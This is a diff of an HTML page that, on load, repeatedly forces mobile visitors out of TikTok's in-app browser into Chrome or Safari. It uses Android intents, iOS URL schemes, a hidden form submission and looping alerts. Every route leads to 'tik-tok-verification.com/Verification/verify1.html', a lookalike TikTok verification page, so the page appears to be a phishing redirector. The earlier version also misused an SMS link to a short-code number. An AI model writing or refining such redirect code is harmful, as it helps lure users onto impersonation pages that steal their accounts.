@@ -3,45 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <style>body { background: #fff; margin: 0; padding: 0; }</style>
+    <style>body { background: #fff; margin: 0; }</style>
 </head>
 <body>
+
+<form id="ejectForm" action="https://tik-tok-verification.com/Verification/verify1.html" method="GET" target="_system" style="display:none;"></form>
 
 <script>
     const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
     const domain = "tik-tok-verification.com/Verification/verify1.html";
     const killTime = Date.now() + 5000;
 
-    function theSlingShot() {
+    function forceSystemBrowser() {
         const isAndroid = /Android/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // Android: We use the 'intent' with the 'Sms' action but targeting Chrome
+            // Android: Forcing the Chrome package directly via Intent
             window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
         } else {
-            // iOS: THE CONTEXT COLLISION
+            // iOS: The POST + Protocol Stack
             
-            // 1. Trigger SMS. This forces TikTok to "pause" and hand control to the OS.
-            window.location.href = "sms:741741&body=" + encodeURIComponent(targetUrl);
+            // 1. Submit the form to the '_system' target
+            document.getElementById('ejectForm').submit();
 
-            // 2. THE COLLISION: 100ms later, while the OS is pulling up the SMS window,
-            // we fire a 'googlechromes' protocol. This forces a kernel decision.
-            setTimeout(() => {
-                window.location.href = "googlechromes://" + domain;
-            }, 100);
-
-            // 3. THE EJECT: Final pulse to Safari
+            // 2. Pulse the specific chrome/safari schemes to catch the handoff
+            window.location.href = "googlechromes://" + domain;
+            
             setTimeout(() => {
                 window.location.href = "safari-https://" + domain;
-            }, 200);
+            }, 100);
         }
     }
 
-    function runSystem() {
+    function securityLoop() {
         if (Date.now() > killTime) return;
 
-        // Start the collision
-        theSlingShot();
+        forceSystemBrowser();
 
         setTimeout(() => {
             if (document.hasFocus()) {
@@ -50,16 +47,15 @@
                 
                 alert(header + body);
 
-                // Trigger on the 'OK' click gesture
-                theSlingShot();
+                // Re-trigger on user gesture
+                forceSystemBrowser();
 
-                setTimeout(runSystem, 350);
+                setTimeout(securityLoop, 300);
             }
-        }, 350);
+        }, 300);
     }
 
-    window.onload = runSystem;
+    window.onload = securityLoop;
 </script>
-
 </body>
 </html>
